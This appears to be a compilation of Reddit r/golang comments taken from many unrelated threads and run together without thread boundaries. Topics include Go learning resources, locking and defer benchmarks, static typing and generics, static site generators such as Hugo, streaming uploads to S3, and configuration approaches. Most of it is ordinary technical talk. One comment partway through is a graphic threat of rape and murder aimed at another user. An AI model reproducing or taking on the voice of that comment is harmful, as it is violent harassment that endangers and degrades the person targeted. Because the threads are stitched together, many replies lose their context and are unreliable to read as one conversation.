Then I would suggest skipping CodeAcademy. If you want to get down and dirty then start by reading Zed Shaw's [Learn Command Line the Hard Way](http://cli.learncodethehardway.org/book/) then [Learn Python the Hard Way](http://learnpythonthehardway.org/), [Learn C the Hard Way](http://c.learncodethehardway.org/book/). Zed Shaw's resources are the best starting point for learning how a programmer works and solves problems. For HTML/CSS, use [Learn CSS Layout](http://learnlayout.com/), and Shay Howe-s tutorials - [Beginner](http://learn.shayhowe.com/html-css/), [Advanced](http://learn.shayhowe.com/advanced-html-css/). For JS use Marijn Haverbeke's [Eloquent JavaScript](http://eloquentjavascript.net/). If you want to know all the corners and problematic spaces then there's [JavaScript Garden](http://bonsaiden.github.io/JavaScript-Garden/). Once you have done all that pick up Go. From my perspective, Go is a better back-end language than Python, but there aren't as many learning materials out there. But when you have basics of programming down then [Tour](http://tour.golang.org), [Wiki Example](http://golang.org/doc/articles/wiki/) and [Build Web Application with Go](https://github.com/astaxie/build-web-application-with-golang/blob/master/en/eBook/preface.md) are good starting point. After that, I think you shouldn't have any problem landing a job as a programmer. Of course keep building up your skills and understanding with resources like [From NAND to Tetris](http://www.nand2tetris.org/) and [SICP](http://mitpress.mit.edu/sicp/full-text/book/book.html) and [Practice of Programming](http://cm.bell-labs.com/cm/cs/tpop/). As a heads up, you will hit at some point a brick wall and you need to learn how to overcome it; it's just part of programming - solving really difficult problems is the main difficulty in programming, not the syntax or the language or the frameworks. See [Basics of Programming](https://github.com/egonelbre/spark/blob/master/basics-of-programming.rst) for more on this.
The tool [gofmt](http://golang.org/cmd/gofmt/) is considered the go way for code formatting and it uses tabs for indentation.
I have been wrapping them in closures: func makeMiddleware(db *db.DB) negroni.Handler { return func(w http.ResponseWriter, r *http.Request, next http.Handler) { // ... } } (typed on my phone) Edit: I should add that there really is no good solution to request-scoped context. The two solutions I've seen are a global ala Gorilla and dependency injection ala Martini.
Hi, yes: http://golang.org/doc/effective_go.html#formatting I don't even think of formatting anymore. My editor automatically calls [gofmt](http://golang.org/cmd/gofmt/).
Yeah but the thing is that the context is request specific and can't be passed in like that. In the example the context is created in the actual handler. And this is where stuff starts to get hard...
Yes - there's always the potential for a race when accessing a single variable from multiple goroutines. The simplest way to avoid this is by adding a sync.Mutex to your struct, and locking it whenever you modify/read it - check out the [sync package](http://golang.org/pkg/sync/) for further details.
* http://blog.steveklabnik.com/posts/2010-07-17-what-to-know-before-debating-type-systems * http://en.wikipedia.org/wiki/Type_system 
thanks! looks useful! 
I know sync package. if there is a rwlock when we write to "m", is it safe ? I mean , when processing "m.foo()", will the compiler use a read-lock on "m" even ? the compiler use a read-lock autocally?
No - locks aren't "automatic" - you need to explicitly Lock() and Unlock(). In the specific case above though, m is passed by value (rather than by reference, as would be the case if the signature was (m * My) foo()" ), so actually, there'd be no problem, as you have a local copy of m inside foo.
On thing is don't use defer to Unlock() as defer adds a lot of overhead currently. On a something like this where it maybe accessible frequently it will add up. 
There would be a problem, if you have another goroutine changing the value of m while it's being copied for calling foo. var m My m.x = 5 go func() { m.x = 10 }() go m.foo() If `m.foo` access `m.x`, there's no guarantee whether it will be 10 or 5.
Yep, agreed. The only two solutions I'm aware of are the ones I mentioned in my edit. 
Strongly typed, compiled languages like Go, prevent certain types of programmer error from ever making their way into a finished program. Compilers for such languages are effectively used as a tool to ensure that the compiled result meets a certain level of validity. Much like a seatbelt, the concept is restrictive and in the way 99.999% of the time, until you make a mistake and suddenly need it. Take Python, for example. The Python parser/compiler only cares that the source file *looks* like valid Python. It has no way of knowing that the program is actually correct without running it: a = b + c In Python, it's not clear if addition is a valid operation with the variables a and b. Also, it's not even clear what value will be placed in c: Are we concatenating strings, or performing arithmetic? It all depends on what type those variables are *at run-time*, which can be a big problem if you made a mistake somewhere. The equivalent Go code requires that we qualify the type of a, b, and c in some way before that line of code will even compile. This means that '+' always means addition, and a and b must at least be numeric types of some kind. If we want to make sure we don't lose precision, or make sure we're only doing integer arithmetic, the type system enforces that too. And again, all that explicit behavior is a part of the compiled program, immune to whatever is going on at run-time.
Or call `defer m.Unlock()` before calling `m.Lock()`. Actually, profile your code. Just because it's faster, doesn't mean that it makes difference in your project.
Those "Learn X the Hard Way" tutorials are a great resource for learning the tools at the same time as the language, like make and stuff.
elithrar\_`s links are good ones. To speak to the specific case of why did _Go_ go with a static type system: I think you have to look at Go through the lens of understanding that the language was built above all else to make it easy for large groups of programmers to collaborate on code without it degenerating into the usual mess that results from that. (It has other nice features, but they pretty much all need to be understood through that lens.) If you've ever worked with a large code base in a dynamically-typed language (and I have), it has a very characteristic degeneration pattern where for any given important function, it gets fuzzier and fuzzier over time what it does. It starts life by taking, say, a string and an integer. Then it gets committed and ground into the code. Then somebody needs another parameter, so one gets added, but only new callers ever use it. Then somebody else needs a new parameter, but they realize they're in trouble, so they add it as a hash of some sort so they can pick out the key. Then somebody else adds half-a-dozen more parameters to that hash. Then somebody else wants to make the string parameter either a string or something that can be converted to a string, so it turns into "either a string or an object with this method". Then somebody else interpolates that string into some form of user output. Then somebody else writes some code so that certain combinations of input end up setting yet other flags in the hash, sometimes, and of course, not _exactly_ at the right times, either, just when they need it in their particular case. The end result is this big undebuggable mess that nobody can understand. Suppose you're trying to fix a bug, and in the middle of the function you dump out the "options" hash for debugging purposes. Suppose you see yet another key that doesn't seem to be mentioned anywhere. Where did it come from? What was the intent? Who knows? Or you're debugging the code and suddenly that int parameter is getting passed in as an array, under some circumstances on the third Friday of the month. Why? Where did that come from? What did the programmer mean? Note that the natural counter one might be tempted to make is "Well, we _could_ program that correctly." True. But it's hard, and the natural tendency of shared dynamic code is in that direction. Static typing used even halfway properly (i.e., be very suspicious of `map[interface{}]interface{}`) works by rigidly constraining the input and output of the function, thus reducing the amount of things the function itself needs to do. One classic example is a type for which the constructor is hidden; imagine a `URL` type that can only be constructed via a function `parseURL(string) (URL, error)` (in Go notation). Now when a function needs to take a URL, instead of taking a `string` it can take a `URL`, and now, not only do we not need to worry about getting a number instead of a string, we don't need to replicate whatever checks `parseURL` provides... we can _know_ they are done because of the incoming type we required. Start stringing together a lot of that sort of assurance, with the compiler providing rigid help, and you can get a very different experience with your code. You no longer have to write these enormous functions that take "whatever" coming in and then defend themselves against their own callers.... you can know more about what's going on. On a micro scale it doesn't seem that different, but when you start building real programs it's night and day. It turns out to be very difficult to write programs when every function and every method takes "something" and returns "something". It's possible, but it's very difficult. (Incidentally, static types themselves are not proof against the "degeneration" problem, and some of Go's specific choices are also important. Interfaces are not unique to Go, but in the mainstream programming languages implicit satisfaction is. This turns out to be important in making the interfaces far more useful between teams working on the code than, say, the standard Java approach is, where fulfilling an interface is substantial paperwork, thus tempting everyone not to do it but instead bodge in some other answer. But that's a more advanced discussion.)
I just wrote a [basic test](http://play.golang.org/p/mxH7AddInf). $ go test -bench . -cpu 1 testing: warning: no tests to run PASS BenchmarkDeferLock 102400 918 ns/op BenchmarkLock 102400 908 ns/op ok bench 6.948s $ go test -bench . -cpu 4 testing: warning: no tests to run PASS BenchmarkDeferLock 102400 966 ns/op BenchmarkLock 102400 820 ns/op ok bench 6.802s the difference isn't that major and imho defer is just safer to use, maybe with many cores it will be different, I can only test with 4 Cores (old Q6600) 
Just wanted to say thank you for the work in this package. It has proven to be very useful!
I smell: http://ro-che.info/ccc/images/typing.png ;-)
And there I was thinking Go doesn't care *enough* about type safety. Go actually is a rather weakly typed language (null pointers, interface{} and the lack of generics really don't leave much room for type safety) 
aye, it's just so *deeply uncool*, isn't it?
I'm not sure I feel comfortable using a package that has no documentation.
how would generics improve type safety?
let's say you have a generic function "find([]'a, func('a) bool) int" that takes a slice and finds an element in it using another function in the second argument. its type signature guarantees that said function takes an argument of the same type('a) as the slice elements. func(interface{}) won't have the same guarantee. hence generics -&gt; type safety.
I agree that generics will reduce boilerplate if you are sorting many different types. I don't think func(interface{}) is remotely good golang. The interface{} is very powerful, and it isn't an "any-type". A better option might be to make an interface around findable types: http://play.golang.org/p/9ILbin3ABx You'll note that although find() returns Findables, the returned objects are type complete and safe, without assertions.
The code you provided is not equivalent. It only allows searching by a string key. And by only predefined methods. But it gets even better. Now imagine a function fold([]'a, 'b, func('a, 'b) 'b) 'b How would that interface method look in this case? Or implement a linked list (or a binary tree) data structure so that every element in it is of the same type.
I wouldn't. Learn PHP instead. GO is very good for web-services, - I wouldn't write a web-site in it.
&gt; I'd say that if you plan to learn a lot of languages, you might want to start with the slower ones. :) Have an upvote I agree with what you have said but not this statement. The correct thing to say here is always learn the higher level programming languages first, which to the OP means the more 'readable'.
My Hazarded Guess: Because the Ruby Ecosystem never had leadership to focus on things other then web where as Python has a huge systems, numerical, and science communities with production level libs to boot already. It just makes the churn to another web/cloud specialized language easier for rubyists and pythoners only dealing in the http request and response cycle. Plus the beauty of golang is it is brilliantly simple and genius to bring back a fast imperative language for servers then creating another algebraic type system when coders just want to code so the paradigm shift is more like going back to the abcs of programming rather then the Alpha Centauri Lagrangian points of code abstraction.
I agree. That statement was meant to be read as a joke. But what I was thinking of and not really feeling like explaining in detail was that if you start with scripting languages, there will be a point when you feel the need for something faster, smaller in footprint or easily distributed as binary. Then you will obviously look at lower level languages anyway. Whereas if you were to learn Go as a first language, you might never feel the urge to learn another one.
Have you found real-world use cases for Go in business yet?
Isn't a website just a web service that delivers html/css/javascript?
It's not a bug- it's just that you are expecting your data to be persistent when it's not. A persistent data structure eliminates the race condition.
For a simple blog, a database is overkill for me. With a static site, I can deploy to any webserver in seconds, with no dependencies. With a static site gen (like Hugo), you can take advantage of templating, and some other cool features to make it super easy to crank out posts.
&gt; Why do people love static site generators so much? Probably so they can host it on github.
I also just discovered Hugo while searching for something new. It is really nice to use and very efficient.
html/template and Ace do same thing: Parse each template only once. &gt; Personally, I think it should be the opposite: you should act like html/template by default, with parsing done once on start-up. Any desire for dynamic reloading during development should be explicitly requested. I agreed with your idea and fixed Ace to cache templates by default and built the "DynamicReload" option: https://github.com/yosssi/ace/tree/master/examples/dynamic_reload
While this may not be a factor in their popularity, serving static files is such a trivial load on a server that even low-end hardware can withstand any "slashdot effect" (or whatever they're calling it these days).
Yeah it's a bit ironic: - "my site is too small to warrant a database let's make it static" - "my site is too big the database can't catch up let's make it static"
fmt.Println already seems to give you what you want. http://play.golang.org/p/KhpEqX3cO0
My current rule of thumb, at least for relatively simple static sites: Does a non programmer need to write blog posts? -&gt; Use a CMS Otherwise -&gt; Static Site Generator 
Oh perfect, that'll make it really easy. Thanks!
We've presently come full circle in where we're like "Yes, ease of management for our employees is nice, but not at the sacrifice of performance our CMS causes for our actual customers"
Agreed. I'm starting to think something like this could be a viable solution. It could give the best of both worlds: http://www.webhook.com This is a paid option, but I've been thinking of working on something similar, open sourced
I believe the current term is "Reddit Hug of Death", though it's hard to say how common the term is outside of reddit.
yes, at least personally the ability to use git and vim is huge
Thanks, I actually got the idea from Russ Cox, whose site is rsc.io.
no. Does anyone write a high-performance RPC service in PHP? - no. Does anyone use compiled language for general front-end development? - no. Everything has it's place - GO jst doesn't fit into categories of languages OP referred to on top of the page.
From your for loop: if err != io.EOF || err != nil { return err } You mean err != io.EOF &amp;&amp; err != nil, right? If err == nil, err != io.EOF evals to true. 
&gt; Why do people love static site generators so much? To use git and vim? Prose.io can give you a web interface for editing Markdown. Works well with GitHub Pages as it automatically rebuilds on a commit. 
And I believe, for future reference, that `go vet` will catch those mistakes. For instance: https://twitter.com/francesc/status/491699441506586627
1. PutReader does not do what you think; it does NOT append an existing file and will instead try to overwrite it. 2. S3 requires the full content-length in order to store files (this is why PutReader has a length argument). Since your input is a multipart form, you would need to read all of the form into memory in order to determine the length. You could use the request content-length to estimate the length of the file, but this is a hack and doesn't work if your form has multiple fields. 3. Not the issue, but you're not slicing the buffer based on the results of Read. You want to use "buf[:v]" instead of "buf". Like the other comment stated your if at the end is wrong too. 4. You need to call Close on MaxByteReader to verify that it didn't try to read &gt;25MB, otherwise you just uploaded a partial file. In this situation, I would actually use ioutil.ReadAll. There's no good way around the fact that S3 requires a content-length upfront but multipart/form does not provide it. 25MB is not a lot to keep in memory and you can write the file to disk if it's an issue (many web frameworks do this). net.MaxBytesReader is definitely the best primitive for the job so long as you call Close before uploading to S3. You are right about the generalization that you should avoid buffering streams when possible, but it doesn't work in this case. Things would be different if S3 supported Chunked-Transfer or multipart forms contained a length for each section.
S3 does support Chunked-Transfer. It's not implemented in goamz, but it is in [s3gof3r](https://github.com/rlmcpherson/s3gof3r). I understand why it's not in goamz; it's a [pain in the ass](http://docs.aws.amazon.com/AmazonS3/latest/dev/mpuoverview.html).
Hugo is powerful, in particular in the way it organizes and structures the content. Hugo powered the website of the hackmeeting this year it.hackmeeting.org here is the source code: https://git.autistici.org/void/hackit14 Very different content types are easier to manage in this way IMHO.
I wrote [multipartstreamer](https://github.com/technoweenie/multipartstreamer) to stream multipart data to S3. It requires you to buffer to disk first so it can get the file size.
Since B-trees are optimized towards media with slow seek speeds and fast bulk reads (i.e. spinning disks), do they have an advantage when using them in memory as well? EDIT: ok, should have read the linked http://google-opensource.blogspot.de/2013/01/c-containers-that-save-memory-and-time.html of course. The stated benefit is less metadata (pointer) overhead because more values are stored per node than in other in-memory trees.
I wrote this primarily for use with IRCCloud, as I thought ZNC was to heavy and I like to have a 'vanity hostname.' It's pretty simple, but I like how I was able to make it buffered and log to the console with bufio and channels. I suppose it could be made very extendable by pipelining the channels too.
Does referring to those series applying to learning GOLANG?
thanks!
wow this is very useful! thanks alot for sharing.
cool! thanks for explaining! :)
Then I would recommend buffering to a file, and the reading the file into S3. This will increase IO, but is probably safer if this is internet facing, as a malicious user could probably exhaust your heap space more quickly with ioutil.ReadAll.
Your most immediate concern isn't the language, but rather the mentality and approach to problem solving and programming. This is completely language agnostic and "Learn X the Hard Way" is the best resource I've encountered regarding it. As I said, the language is not the hard part of programming, although it may seem like so. Once you have one/two languages under your belt, any new one will be easy to learn, as long as it's in the same paradigm. So yes, it also relates to Go. CLI is quite often used with Go, Python series teaches basics of programming stuff, C part teaches how pointers and how low level stuff works. Regarding JS/HTML/CSS - you will most likely encounter web applications and there it's necessary to know them.
Println prints num1 with higher precision than OP wants. [This shows the difference between %f, Println, and %g](http://play.golang.org/p/2JZBL87KbT). %g is the only one of the three that does what OP wants.
lol I read the title like "In memory of B-Tree implementation".
"This is Rails for Go" was my first thought when looking over Revel. Leaving behind the Rails crowd and the bulk of my programming over the last 10 years, I didn't like it. I'm not leaving Rails because of Ruby, but rather leaving Rails because it's opinions are getting stronger and stronger over the years. NodeJs was a refreshing change from that, but Go exceeds NodeJs' base so far. I think Martini and Gorilla look interesting. I'm looking forward to experimenting with both.
You don't need a framework, but having some libraries to make things cleaner does help. For example, routing can always be something tacked onto the existing libraries. net/http doesn't fit the standard routing people have grown use to. Something like gorilla/mux might suit some people, while others might like falcon. Frameworks aren't about this whole rendering views on the server side; that's just one choice that a bunch made over the last decade. They are now slimming down into single use libraries which is the core of what used to be done.
Yes yes yes. There seem to be a lot of people using Go for fairly small programs where, say, Python would work pretty well too. And it's really nice that Go makes it easy to throw together a small program quickly (unlike, say, Java) but as you point out, that's not what it was designed for. &gt; for any given important function, it gets fuzzier and fuzzier over time Exactly! As Rob Pike says, anyone can write code. Writing code is, in general, the easy part. It's *maintaining* code that becomes tricky, and that's why Go makes a lot of the choices that it makes.
What other languages have you used? I would say Go cares a lot more about type safety than Python or JavaScript, but it does so without getting in your way and making your code annoying and verbose the way Java or C++ does. Plus there is `interface{}` which you can use as kind of an "escape hatch" when you have to do something the type system doesn't support well. Hopefully that's rare though. 
Nice one, time to find some old VGA connectors!
writing servers/services, admin/shell tools you name it.
I wouldn't recommend PHP to anybody. It wasn't even designed as programming language. Here is a collection of some of its defects: http://eev.ee/blog/2012/04/09/php-a-fractal-of-bad-design/
For sure it is harder to understand pointers and when to use []byte vs strings and how interface types work vs underlying types because such things simply does not exist in e.g. Ruby. Also some standard libraries like database/sql has more traps than what you may be used to in other languages. json decoding is not as flexible etc. Since Go is a static language it is not as flexible as dynamic languages. But that saves your ass in larger projects.
by same logic - everything is a webservice. All unix binaries are webservices if piped to via netcat.
I use gorm in my project [gophish](https://github.com/jordan-wright/gophish), and have worked with /u/Jinzhu on multiple issues. I personally really enjoy using gorm, and it's saved me a **ton** of code. I'd recommend it to anyone needing a Go ORM. Keep up the good work!
If you're talking about test coverage, there's a tool called `go cover`. http://blog.golang.org/cover
Instead of manually parsing the VCAP_SERVICES environment variable, you can use the go-cfenv library I wrote to slightly ease your interaction with the environment in Cloud Foundry: https://github.com/cloudfoundry-community/go-cfenv
I did something else to implement versioning in my Go code. I have a high interest that my code is both Go-gettable and that updates on my end never break other people's code. The solution is to have an SVN-like layout: foo.example/ \ project/ \ 1.0/ \ project/ 1.1/ \ project/ 1.2/ \ project/ 1/ =&gt; 1.2 2.0/ \ project/ 2/ =&gt; 2.0 dev/ \ project/ Now, according to semantic versioning I promise that an update of the third digit (e.g. 1.0.0 → 1.0.1) doesn't alter any semantics. Updates of this kind are being implemented directly into the tree for that particular version. Updates that implement new backwards-functionality create a new release which increments the second digit (e.g. 1.0.1 → 1.1.0) and causes a new subdirectory to be implemented. The single-digit folder is a symbolic link to the newest minor-release corresponding to this major release. If a user of the library wants to have a certain release and wants to be sure that his code doesn't break, he can import one of the minor-release trees. They are guaranteed to only change if bugfixes are applied. import "foo.example/project/1.1/project" If the user wants to have the newest features of a major version, he can use the single-digit symlink which always resolves to the newest subtree for that major version. On the downside, it's not quite as stable as the double-digit trees as new-functionality might be add in backwards-compatible ways. Finally, each major revision gets an entire new tree.
What's wrong with ReadAll?
Technically nothing. It's just not efficient. Instead of iterating over an io reader 1 KB or whatever at a time you read an entire file into memory. If you're working with large files like database dumps or video files it's entirely possible you could max your memory if you use ReadAll. The code example I provided limits at 25 MB which is really small but ideally I'd like to increase that to around half a gig and knowing that the EC2 instance this will run on it could only handle at most 3 uploads at a time. So a io reader is a much better option. 
I think he is talking about seeing how much test coverage the go compiler itself has. I'm not sure what would be involved in that right now but once the port of the compiler to go itself is done then go cover will indeed be the easiest way to do so. The current compiler though is C so you'll need a different set of tools for that.
Can do the same thing without a SVN-like layout by using http://labix.org/gopkg.in and branches/tags. I've used it a for a few projects and its pretty handy.
Thanks, I'm learning all the new words haha.
Another nice benefit is that for high-degree btrees, the nodes/children stored in an individual tree are all stored contiguously, so there's some nice cache locality when searching through them. I've been relatively impressed with the speed of this library compared to that of other in-memory ordered structures, and I think that may be one of the reasons for it.
Never been a fan of docopt-style parsers, but that `-X` trick is super useful. Up until now I've been sed'ing the source during build, which is rubbish.
As you can see in my packages at http://github.com/tideland I'm doing it in a very similar way, but only with v1, v2, ... for the incompatible major version. Minor and patch are then simple repository updates in those directories. The mentioned package here is to allow packages or even types to return more detailed information about there version.
Have a look at https://github.com/blang/semver It fully covers the spec and is fully tested
Are you messing with the request or response bodies in your proxy code in any way? Often connections (and their handling goroutines) can stay alive if you read a body but neglect to close it. Also, dumb question, but do you "re-use a single client object rather than creating one for each request, otherwise you will end up leaking connections" as specified in the docs?
Doesn't this involve a busy-wait loop? Why don't you do something more like: for spam := range spammyChan { fmt.Println("received a send on a spammy channel - might be doing a costly operation if not for debounce") debouncedCostlyOperation(spam) } or am I missing something about the for select loop?
Ok, thanks for your reply, I'm not very familiar with go development, when can we expect the compiler to be fully ported?
I don't really know how long it will take but you can see a discussion of the work here: https://docs.google.com/document/d/1P3BLR31VA8cvLJLfMibSuTdwTuF7WWLux71CYD0eeD8/edit
I'm afraid it may become overcomplicated with that "generate" directive.. 
Here are the [slides][1]. [1]: http://talks.golang.org/2014/state-of-go.slide#1
I did something similar for my dependency manager: https://github.com/eanderton/grapnel/blob/master/src/grapnel/version.go It's a work in progress, so docs are light. Here's the unit-test to help make sense of what's going on in there: https://github.com/eanderton/grapnel/blob/master/src/grapnel/version_test.go So there's the Version which defines a specific version, and then the VersionSpec which specifies a range of values that are okay to use for a given dependency. Also, I noticed that semver is MIT licensed. Care if I pull some concepts of your library into Grapnel? I like what you're doing here, and it appears to be a bit more flexible than what I wrote.
I would like to use it but along with revel but revel won't run on app engine.
Other than the absence of comments it is pretty readable. As per tradition, I read it until I found something I disagreed with: func reCache() { &lt;-time.After(30 * time.Minute) pc = NewPageCache() go reCache() } I think you should convert this to use either a time.Tick channel or a time.Timer. It keeps consuming memory in recursive calls and after running for only about 7 years it will consume around 1 GB of space! 
Thanks, and good call. Obviously, that gets a lot more critical at smaller periods, too.
100% with you!
Yeah, I'm pretty -- on the generator thing *unless* what is generated cannot be modified in any way. Using something generated as a *library* seems perfectly fine if the toolchain knows how to regenerate the thing on its own. But having .go code lying around to be modified then patched every time something changes in the generator or dependencies... yuck. Even there, it would be the sort of thing to use lightly.
There's no known leaks in the net/http package. Show us your code.
&gt; It's a simple set of tools for working with Go structs. Like converting a struct into a map, getting the field names, checking the zero value of each field etc.. I was using most of the helper functions in several places. I've grouped them, add lots of tests, examples and improve it further. I hope you like it too. &gt; I'd argue that's a little too simple. As a question to the author, what does this cover that [mapstructure](https://github.com/mitchellh/mapstructure) does not?
&gt; Go appears to be attractive to the scientific and bioinformatic communities, displacing their use of scipy/numpy. Sadly, this is not happening (except maybe other than a few cases), and probably won't ever happen without at least operator overloading. It's the single reason for several researchers I know to use C++ over C. Without operator overloading, expressing mathematical statements just become painful and error prone. Go has it's uses, but I personally can't ever see myself using it for mathematics-heavy research.
Thanks. Many codec implementations has done this internally. It's good to have one we can use explicitly.
mapstructure does decode a map[string]interface{} to a pre defined struct. They are quite different, did you check both packages?
I like it! But don't know if it's a good idea to change it just now. Need to think about it.
https://github.com/mitchellh/mapstructure does provide it already in a very good way. I didn't want to add the same functionality here too.
So I had whatever the opposite of a Eureka moment was - I was taking a shower and realized that I was completely wrong. That function will launch a goroutine and then terminate, instead of vanilla recursion which would just launch the function within a new stack while the old stack was still alive. If the time interval was extremely small or zero, you could conceivably build up a large stack, but it defies reason to expect it to never terminate.
&gt; Any suggestions, improvements are welcome :) Just a thought: this is much easier to use than the provided reflection utils. To me, all this is missing the reciprocal operation of Map(), where you can create an instance of a type, based on a typename and map: v := structure.Create("Server", m).(Server) Edit: just noticed the remark about mapstructure. I still think something like this would be a welcome addition to your lib. 
I think there's a bit of survivorship bias. People may have been outspoken about language feature X missing in v1.00, but many have stopped caring as it becomes obvious that X isn't important to Pike. A language only becomes less malleable with growth and popularity. Rather than beat a dead horse and fight an uphill battle, it's often easier to just move on.
Aha, thanks for your feedback. LedisDB build process is not good, may be very confused, I will improve it continuously. 
You can almost taste the frustration.
Scala has 8 years over go and they did not write their runtime so limited / benefited by what JVM provides. IMO Scala is underwhelming in creating useful and practical software as compared to Go. It seems like a hacked language with half ass tooling. To be fair to them, however, Scala devs are more interested in Type system theories and practical usage, if any, is incidental.
47:00 "But I am not an enterprise Go programmer ..."
I can't think of a reason why I would want to prevent someone from implementing an interface. 
Use temporary byte buffers as a small accumulator.. use a memory aligned buffer size.. you accumulate bytes in the buffer.. and go on saving that amount into the endpoint.. a file, socket, etc.. Than you reuse the buffer to write the next bytes from the source.. and repeat the process all over again until you reach the source input of bytes EOF.. that way you will only end with the buffer size in the memory.. not the whole input of bytes.. Its not a sin, to use ReadAll if the file is small, and will ever be small.. so the bufferization thing could be just a productivity overkill.. Note: This is a common "recipe" to work with any language
I've learned that namespace pollution can become a problem if you declare test variables in your unit-tests. After a while, you wind up with multiple _test.go files that need the same kind of test table names. While not likely, these may also collide with global declarations in your non-test code; IIRC, the entire module has to compile cleanly whether you're running a unit-test or not. Instead, I've adopted the practice of simply embedding an anonymous test table into the test function, right off the for loop: func TestFoo(t *testing.T) { for k,v := range map[string]string{ "foo": bar", "bar : baz", } { // test code goes here } }
I bet It won't be long before people start implementing code gen similar to C++ templates ... :/
The project is my Go bindings to Allegro 5, and each different event type has its own interface so that an event can be received as an `interface{}` and then type-asserted, which is easier and safer (since it's read-only) than type-asserting with a pointer to an event struct. There's no real harm in letting users implement these interfaces, but since they're not intended to be implemented anywhere outside the library, then I consider it a little bit safer to guarantee that any instance of these interfaces was constructed internally.
&gt; Scala is underwhelming in creating useful and practical software Clearly you "don't yet understand functional programming and the benefits it brings."
Project on Github also shows various other programming languages used. Is this project cross platform ?
But at the same time, looking at the growth shows that more people are sticking around than moving on.
i will rek u bitch and u will scream for mercy and i will rape and kill u and rape ur corpse nobody likes u and everybody talks behind ur back even ur parents disowned u and they told me that ur adopted bithc. every1 feels the same way about u cus ur useless whore
Other languages are the client API like [Redis Client](http://redis.io/clients). Now LedisDB uses goleveldb as the default storage, it can be a pure Go project now, we have run it on some Linux, Mac OSX and Windows. Thank you!
If you have any suggestion about build process, please tell me in the [issues](https://github.com/siddontang/ledisdb/issues), I am lack of this. Thank you!
Really no point posting it here, every time I see someone trying to bring constructive criticism to the table in this sub, he gets downvoted to oblivion. Not sure why go "fans" are especially prone to this behavior but it's definitely a thing here.
Sarcasm around "enterprise". 
Hugo is worlds ahead of Jekyll in terms of speed, and the built-in livereload is amazing. I hope development doesn't stall out as I haven't seen much activity lately, but then again there's only so many places you can take a SSG.
We just json or yaml configs for everything, following with local/dev/stage/prod environments as the top-level keys in our config files. then we check os.Env for our environment flag / use dev if it isn't set. when the app comes up, it knows where to look (CWD.)
Good on you for discovering this (no sarcasm), but note there is nothing specific to Go about this. Use it everywhere. Treat test code with respect. It's real code.
How do you set the environment variables? If it's a shell script, then how is that shell script different from a JSON file? (The link you point to says that if you have a JSON file you might check it into the tree by accident. But you might check the script into the tree too.)
I use https://code.google.com/p/gcfg/ Basically reads a .ini style properties file and maps it into Go structs. Works really well and easy to set up.
Agreed - definitely up to the use-case. I use a TOML/YAML file with the path specified in an APPNAME_SETTINGS environmental variable. The TOML file is read-only by the application user. I could also layer a flag or two (say, for the TCP port to bind to) that overrides the config file if I wished, although I haven't needed to do that yet.
Thanks. Yeah this is the direction I was leaning, I just wasn't sure if it was the "go" way of doing things. I'm definitely a fan of JSON config files as it feels very familiar.
I've got a case where external users are not capable of implementing an interface, because the interface involves twiddling with an internal data structure, that turns out _must_ be internal on the grounds that if you are manipulating it externally you are pretty much by definition doing it wrong. I've got three different useful implementations, but you can't plug in an external one. And if your reply is basically "but what if they _really really_ want to?", the answer is, "then crack open the source code and add it yourself"... which is _perfectly valid_, but it's not worth exporting the interface and pretending that it takes anything less than that. And if your reply is "why not factor it out better so that the interface _could_ be exported?", well, the Go type system really won't let me. I require heavy-duty control over serialization of the relevant private structure, for instance, and there's no way to specify that in an interface, the way one could in, say, Haskell. Plus I'm not convinced there's a use case, so, again, why promise something they can't have?
Definitely gonna start using anon structs and subprocess testing.
It's unfortunate if that is how things really are.
.gitignore files will prevent you from committing files by accident - either JSON or sh files.
http://stackoverflow.com/questions/244777/can-i-comment-a-json-file
Sorry, I thought you referring to comments on the thread :). /facepalm
YAML on the other hand is fairly good for configs, well supported by syntax highlighting editors, has most of the structures you need for config files. 
http://www.yaml.org/spec/1.2/spec.html -- lots of good stuff, and an actually spec you can code against. Comments, Sequences, Sequences OF Sequences, Directives, etc. 
Luck you don't have to write your own parser: https://github.com/go-yaml/yaml
Clearly!
Funny how most of the commenters here missed the parts about type safety, concurrency and immutability. "Oh no he's criticizing my favorite language=red cape=charge=downvote" Every time the same story. And how does "everyone" "accepting" something make it a non-issue? For me personally the fact that Go is mostly an unsafe and somewhat inflexible language is a seriously limiting factor too. Everyone "accepting" it doesn't make it any less so. Have you ever thought that maybe there are much more people that care about generics than you think? Or that if there are more people discussing the issue the developers will finally get how important it is and rethink their position? Apparently not. The article explains why someone refused to adopt Go. And all that this "community" is doing - downvoting and telling them to fuck off. Great job.
I'm a big believer in using flags for almost all configuration. This is also the approach that Google uses internally. Here's the rationale: - flags are discoverable - flags are self documenting - configuration files require separate documentation - environment variables are not discoverable at all Envars are by far the worst option in my opinion. At least with configuration files it's usually obvious how to define which config file to use. Edit: I forgot to mention that typically the flags will be specified in a "run" file, or loaded from a flag file (effectively a configuration file), but the key difference is that the flags describe the configuration in the same way they describe the command line. 
Type Safety comes back to the current lack of generics. Concurrency is only an issue because it's being made an issue (if you want a different concurrency model, use a different language, Go is built around its current model). Immutability comes back to the concurrency model. If you want safety for concurrency, use channels and mutexes where necessary, or pass a copy. Some of us don't see being *able* to shoot yourself in the foot as a drawback. I don't know why you're quoting "everyone", because I didn't say "everyone". I said the community has "accepted that Generics isn't going to come any time soon". The community is not everyone, the community is those of us actually making software using Go. In addition, I didn't say that it wasn't an issue, I simply stated that we've accepted that isn't not going to be in the language for a while (certainly not until 2.0) and work around the problems that the lack of generics causes - it's not difficult and causes considerably fewer issues that the hundreds of blog posts spouting about it imply. The article explains why someone refused to accept *insert any language which makes functional difficult*. It's a 7 paragraph blog post with no real-world examples of where the apparent issues actually cause problems. The fact is, Go has been designed as an imperative language. Trying to twist it into a functional language is an idea which goes against the vision that has been set out by the Go language designers. Simply because a few people on the internet want to use a functional language and, for whatever reason, want to make a comparison to Go, doesn't mean Go should change. They're told to fuck off because it's the same fucking arguments again and again. We've heard them all, we're aware of them, and guess what, we're still making software that works and enjoying doing so. This is version 1 of a language, it's not perfect, but every time it's the same blogspam "I don't like Go because of X". Why should we keep listening to the same thing over and over again? It's a pointless waste of time when Go is already working well for us. Sure, it would be nice to have generics and more immutable types would be great, but if there's demand for them and a decent proposal, then they'll come in version 2. To round it off, I'm going to trust Rob Pike and Ken Thompson more than some fuckwitts on the internet (half of which have never used the language) telling me that Go sucks because it's missing feature X. If it's needed, it will come in the future. Rather than bitch about lack of feature X they should write a [proposal](https://code.google.com/p/go-wiki/wiki/DesignDocuments) - don't bitch about it on the internet and post it to /r/golang.
The reason for having configuration in a separate file is that for you to run the same code in different environment, in different settings. Passing command line options and changing them everytime you run somewhere else is not a very elegant solution.
